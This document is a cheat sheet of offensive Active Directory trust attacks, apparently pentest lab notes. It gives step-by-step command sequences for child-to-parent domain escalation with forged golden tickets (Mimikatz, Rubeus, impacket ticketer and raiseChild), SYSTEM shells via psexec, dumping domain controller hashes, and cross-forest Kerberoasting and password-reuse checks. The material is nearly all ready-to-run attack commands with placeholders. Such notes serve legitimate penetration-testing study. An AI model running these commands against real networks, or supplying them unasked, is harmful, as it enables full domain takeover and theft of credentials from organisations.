# Attacking Trusts

### Child ⇒ Parent trust

<mark style="background-color:$danger;">Golden ticket attack</mark>

We need :

* The KRBTGT hash for the child domain
* The SID for the child domain
* The name of a target user in the child domain (does not need to exist!)
* The FQDN of the child domain.
* The SID of the Enterprise Admins group of the root domain.
* With this data collected, the attack can be performed with Mimikatz.

{% tabs %}
{% tab title="Linux" %}
```shellscript
# Get the NTLM for the krbtgt user
impacket-secretsdump <CHILD_DOMAIN_FQDN>/<USER>@<CHILD_DOMAIN_DC_IP> -just-dc-user <CHILD_DOMAIN>/krbtgt

# Get the SID for the child domain => Append our user RID to the Domain SID 
impacket-lookupsid <CHILD_DOMAIN_FQDN>/<USER>@<CHILD_DOMAIN_DC_IP> | grep "Domain SID"

# Get the Enterprise Admin Group SID => We need to append the Group RID to the Domain SID
# [*] Domain SID is: S-1-5-21-3842939050-3880317879-2865463114
# 519: INLANEFREIGHT\Enterprise Admins (SidTypeGroup)
# The SID of the group is => S-1-5-21-3842939050-3880317879-2865463114-519
impacket-lookupsid <CHILD_DOMAIN_FQDN>/<USER>@<PARENT_DOMAIN_DC_IP> | grep -B12 "Enterprise Admins"

# Generate the Golden Ticket
impacket-ticketer -nthash <KRBTGT_HASH> -domain <CHILD_DOMAIN_FQDN> -domain-sid <CHILD_DOMAIN_SID> -extra-sid <ENTERPRISE_ADMIN_GROUP_SID> hacked

# We obtained a ccache file. Now we need to set the KRB5CCNAME Environment Variable
export KRB5CCNAME=<FILE>.ccache 

# Get a SYSTEM shell on the Parent DC
# Ex parent dc computer name => academy-ea-dc01.inlanefreight.local
impacket-psexec <CHILD_DOMAIN_FQDN>/hacked@<PARENT_DC_COMPUTER_NAME> -k -no-pass -target-ip <PARENT_DOMAIN_DC_IP>

# Automate the process => the script will do everything we did above by itself and pop a shell
impacket-raiseChild -target-exec <PARENT_DC_IP> <CHILD_DOMAIN_FQDN>/<ADMIN_USER_IN_CHILD_DOMAIN>

# Dump hashes from our Linux attcker once we have the ticket
# Use option -just-dc-user <USER> if we want a user in particular
impacket-secretsdump <CHILD_DOMAIN_FQDN>/hacked@<PARENT_DC_COMPUTER_NAME> -k -no-pass -just-dc-ntlm

# Dump hashes locally (from Parent DC shell)
https://www.ired.team/offensive-security/credential-access-and-credential-dumping/ntds.dit-enumeration
```
{% endtab %}

{% tab title="Windows" %}
```shellscript
# Get the KRBTGT account's NT hash with mimikatz (or DCSync the DC)
lsadump::dcsync /user:<CHILD_DOMAIN>\krbtgt    # LOGISTICS.INLANEFREIGHT.LOCAL didn't work, I needed LOGISTICS alone. Type whoami to see the correct one to put

# Get the child Domain SID with Powerview
Import-Module .\PowerView.ps1
Get-DomainSID    # We can also get it with the above mimikatz output, in the Object Security ID, without the last part (after the last -)
Get-ADComputer -Identity "<FIRST_PART_OF_DC_DNS_COMPUTER_NAME>" # Check RDP nmap result # https://www.youtube.com/watch?v=LttWZY5nTZo 15 min

# Get the Enterprise Admin group SID from the parent Domain
Get-DomainGroup -Domain <PARENT_DOMAIN> -Identity "Enterprise Admins" | select distinguishedname,objectsid
Get-ADGroup -Identity "Enterprise Admins" -Server <PARENT_DOMAIN>

# Confirm that we have no access to the parent domain
ls \\<DC_COMPUTER_NAME>.<PARENT_DOMAIN>\c$

# Create a Golden Ticket with Mimikatz
kerberos::golden /user:hacked /domain:<CHILD_DOMAIN_FQDN> /sid:<CHILD_DOMAIN_SID> /krbtgt:<KRBTGT_HASH> /sids:<ENTERPRISE_ADMIN_SID> /ptt

# Create a Golden Ticket using Rubeus
.\Rubeus.exe golden /rc4:<KRBTGT_HASH> /domain:<CHILD_DOMAIN> /sid:<CHILD_DOMAIN_SID>  /sids:<ENTERPRISE_ADMIN_SID> /user:hacked /ptt

# Confirm the ticket is in memory
klist

# List the C drive of the parent DC
# Ex parent dc computer name => academy-ea-dc01.inlanefreight.local
ls \\<PARENT_DC_COMPUTER_NAME>.<PARENT_DOMAIN>\c$
```
{% endtab %}
{% endtabs %}

{% hint style="danger" %}
For Linux : In 2023, there was a patch by microsoft which makes `raisechild` ineffective, try generating the golden ticket like this: `ticketer.py -aesKey <CHILD_KRBTGT_AES_KEY> -domain <CHILD_DOMAIN> -domain-sid <CHILD_SID> -extra-sid <PARENT_ENTERPRISE_ADMINS_RID> Administrator`

The `aesKey` can be 128 or 256 and can be obtained in the dcsync output for the user `krbtgt` !
{% endhint %}

### Cross-Forest trust

#### Cross-Forest Kerberoasting

Kerberos attacks such as Kerberoasting and ASREPRoasting can be performed across trusts, depending on the trust direction. In a situation where you are positioned in a domain with either an inbound or bidirectional domain/forest trust, you can likely perform various attacks to gain a foothold. Sometimes you cannot escalate privileges in your current domain, but instead can obtain a Kerberos ticket and crack a hash for an administrative user in another domain that has Domain/Enterprise Admin privileges in both domains.

{% tabs %}
{% tab title="Linux" %}
```shellscript
# Enumerate users vulnerable to kerberoast and get their tickets
# We can also see groups they are part of
# We just need a user who can auth to the original domain
GetUserSPNs.py -request -target-domain <OTHER_FOREST_DOMAIN> <DOMAIN>/<USER>

# We can then connect to the DC with the following
impacket-psexec <OTHER_FOREST_DOMAIN>/<USER>:<PASS>@<OTHER_FOREST_DC_IP>
```
{% endtab %}

{% tab title="Windows" %}
```shellscript
# Enumerate account with SPN associated with PowerView
Import-Module .\PowerView.ps1
Get-DomainUser -SPN -Domain <OTHER_FOREST_DOMAIN> | select SamAccountName,memberof,serviceprincipalname | fl

# Kerberoast with Rubeus => Then crack the hash with hashcat
.\Rubeus.exe kerberoast /domain:<OTHER_FOREST_DOMAIN> /user:<USER> /nowrap
```
{% endtab %}
{% endtabs %}

{% embed url="https://app.gitbook.com/o/OzCeXZoR6hIZ3S7aPLrj/s/d1x5yxrrjMQ55ObqBQ44/~/edit/~/changes/1/active-directory/kerberos/kerberoasting" %}

#### Admin Password Re-Use & Group Membership

If we can take over Domain A and obtain cleartext passwords or NT hashes for either the built-in Administrator account (or an account that is part of the Enterprise Admins or Domain Admins group in Domain A), and Domain B has a highly privileged account with the same name, then it is worth checking for password reuse across the two forests

We may see a Domain Admin or Enterprise Admin from Domain A as a member of the built-in Administrators group in Domain B in a bidirectional forest trust relationship. If we can take over this admin user in Domain A, we would gain full administrative access to Domain B based on group membership

{% tabs %}
{% tab title="Linux" %}
```shellscript
# Run a bloodhound ingestor and look for the query Users with Foreign Domain Group Membership
```
{% endtab %}

{% tab title="Windows" %}
```shellscript
# Enumerate groups with users that do not belong to the domain with PowerView
Import-Module .\PowerView.ps1
Get-DomainForeignGroupMember -Domain <OTHER_FOREST_DOMAIN>
Convert-SidToName <MEMBER_NAME_SID_FROM_ABOVE_CMD>

# If we see an account, try to login to the other forest DC
Enter-PSSession -ComputerName <OTHER_FOREST_DC_COMPUTER_NAME> -Credential <DOMAIN>\<USER>
```
{% endtab %}
{% endtabs %}
